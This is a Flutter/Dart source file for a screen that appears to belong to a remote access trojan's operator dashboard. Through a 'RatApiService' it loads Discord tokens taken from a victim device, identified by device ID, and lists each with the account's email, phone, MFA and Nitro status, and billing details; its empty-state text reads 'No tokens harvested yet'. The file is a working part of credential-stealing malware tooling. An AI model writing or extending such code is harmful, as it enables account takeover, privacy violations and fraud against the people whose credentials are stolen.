import 'package:flutter/material.dart';
import 'api_service.dart';
import 'constants.dart';

class DiscordTokensScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;

  const DiscordTokensScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<DiscordTokensScreen> createState() => _DiscordTokensScreenState();
}

class _DiscordTokensScreenState extends State<DiscordTokensScreen> {
  late RatApiService _api;
  List<dynamic> _tokens = [];
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _load();
  }

  Future<void> _load() async {
    setState(() => _isLoading = true);
    try {
      final data = await _api.getDiscordTokens(widget.deviceId);
      setState(() => _tokens = data);
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Load error: $e')));
    } finally {
      setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    const kBg = Color(0xFF0F172A);
    const kCard = Color(0xFF1E293B);
    const kBorder = Color(0xFF334155);
    const kBlue = Color(0xFF5865F2); // Discord Blurple

    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(
        title: const Text('Discord Tokens', style: TextStyle(fontWeight: FontWeight.bold)),
        backgroundColor: kCard,
        elevation: 0,
        actions: [
          IconButton(onPressed: _load, icon: const Icon(Icons.refresh_rounded)),
        ],
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: kBlue))
          : _tokens.isEmpty
              ? _emptyState()
              : ListView.builder(
                  padding: const EdgeInsets.all(16),
                  itemCount: _tokens.length,
                  itemBuilder: (ctx, i) {
                    final item = _tokens[i];
                    return Container(
                      margin: const EdgeInsets.only(bottom: 12),
                      decoration: BoxDecoration(
                        color: kCard,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: kBorder),
                      ),
                      child: ExpansionTile(
                        leading: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(color: kBlue.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                          child: const Icon(Icons.discord_rounded, color: kBlue, size: 20),
                        ),
                        title: Text(item['username'] ?? 'Unknown User', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                        subtitle: Text(
                          'Nitro: ${item['nitro'] == 0 ? 'None' : 'Active'} • MFA: ${item['mfa'] == true ? 'ON' : 'OFF'}',
                          style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 12),
                        ),
                        children: [
                          Padding(
                            padding: const EdgeInsets.all(16),
                            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                              _infoRow('Token', item['token'], isCode: true),
                              _infoRow('Email', item['email'] ?? 'N/A'),
                              _infoRow('Phone', item['phone'] ?? 'N/A'),
                              if (item['billing'] != null && item['billing'] != 'None')
                                _infoRow('Billing', item['billing']),
                            ]),
                          )
                        ],
                      ),
                    );
                  },
                ),
    );
  }

  Widget _infoRow(String label, String value, {bool isCode = false}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(label, style: const TextStyle(color: Colors.white38, fontSize: 10, fontWeight: FontWeight.bold)),
        const SizedBox(height: 4),
        Container(
          width: double.infinity,
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(color: Colors.black.withOpacity(0.2), borderRadius: BorderRadius.circular(6)),
          child: Text(
            value,
            style: TextStyle(
              color: isCode ? const Color(0xFF10B981) : Colors.white70,
              fontSize: 12,
              fontFamily: isCode ? 'monospace' : null,
            ),
          ),
        ),
      ]),
    );
  }

  Widget _emptyState() {
    return Center(
      child: Column(mainAxisSize: MainAxisSize.min, children: [
        Icon(Icons.discord_rounded, size: 64, color: Colors.white.withOpacity(0.1)),
        const SizedBox(height: 16),
        Text('No tokens harvested yet', style: TextStyle(color: Colors.white.withOpacity(0.5))),
      ]),
    );
  }
}
